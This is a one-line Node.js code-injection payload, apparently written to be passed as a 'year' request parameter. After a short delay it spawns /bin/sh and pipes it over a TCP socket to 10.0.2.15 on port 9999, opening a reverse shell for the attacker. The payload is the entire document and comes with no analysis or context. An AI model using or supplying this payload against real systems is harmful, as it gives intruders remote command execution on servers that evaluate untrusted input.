year=setTimeout(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(9999, "10.0.2.15", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); });}, 5000)